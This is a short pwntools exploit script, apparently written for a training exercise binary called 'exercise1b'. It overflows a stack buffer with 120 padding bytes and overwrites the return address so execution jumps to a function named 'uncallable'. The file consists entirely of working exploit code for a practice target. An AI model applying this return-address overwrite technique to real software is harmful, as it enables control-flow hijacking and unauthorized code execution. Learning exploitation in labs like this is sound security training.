#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template
from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='amd64')
exe = './exercise1b'

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
b *main
b *check_authorization
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================

r = start()
e = ELF(exe)

if args.PAUSE:
    pause()

#Way to get the main address
main_static_address = e.symbols['main']
#log.info(hex(main_static_address))
uncallable_static_address = e.symbols['uncallable']
#log.info(hex(uncallable_static_address))
check_authorization_address = e.symbols['check_authorization']
#log.info(hex(check_authorization_address))

initial_output = r.recvuntil('password:\nnonexistant', timeout=1)
#log.info(f"initial output was: {initial_output}")

exploit = b""
exploit += b"A" * 120
exploit += p64(uncallable_static_address)
r.sendline(exploit)

final_output = r.recvall()
log.info(f"final output was: {final_output}")

